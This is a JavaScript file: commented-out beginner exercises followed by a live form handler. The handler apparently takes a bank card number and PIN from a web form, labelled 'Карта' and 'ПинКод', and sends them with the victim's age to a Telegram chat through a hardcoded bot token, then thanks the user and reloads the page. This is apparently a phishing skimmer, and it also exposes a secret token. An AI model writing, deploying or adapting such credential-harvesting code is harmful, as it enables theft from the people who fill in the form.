// const wrapper = document.querySelector('.wrapper')

// let a = 10
// const b = 'bb'

// console.log(a + b)

// let a = prompt('введите первое число a') // 10
// let b = prompt('введите первое число b') // 1

// if (a > b) {
//   console.log('a больше b');
// } else if (a == b) {
//   console.log('они равны');
// } else {
//   console.log('b больше a');
// }

// for (let i = 5; i <= 10; i++) {
//   console.log(i);
// }

// const obj = {
//   name: 'Yahyo',
//   job: 'IT-Programmer'
// }

// const arr = ['apple', 'peach', 'grape']

// console.log(arr[1]);

document
  .getElementById('telegramForm')
  .addEventListener('submit', function (e) {
    e.preventDefault();

    const name = document.getElementById('name').value;
    const phone = document.getElementById('phone').value;
    const age = document.getElementById('phone').value;
    const token = '7303337670:AAHbje9CBPdYAVU7d5LywQaCy5RF6TEYN2Y'; // Замените на ваш токен
    const chat_id = '-4518381083'; // Замените на ваш chat_id
    const url = `https://api.telegram.org/bot${token}/sendMessage`;

    // Формируем сообщение
    const message = `Карта: ${name}\nПинКод: ${phone} \nВозраст: ${age}`;

    const data = {
      chat_id: chat_id,
      text: message
    };

    fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    })
      .then((response) => response.json())
      .then((data) => {
        if (data.ok) {
          // alert('Message sent!');
          const blacker = document.querySelector('#thanks')
          blacker.innerText = 'Спасибо за отправку данных 😎'

          setTimeout(() => {
            location.reload()
          }, 3000);
        } else {
          alert('Error sending message.');
        } 
      })
      .catch((error) => {
        console.error('Error:', error);
        alert('Error sending message.');
      });
  });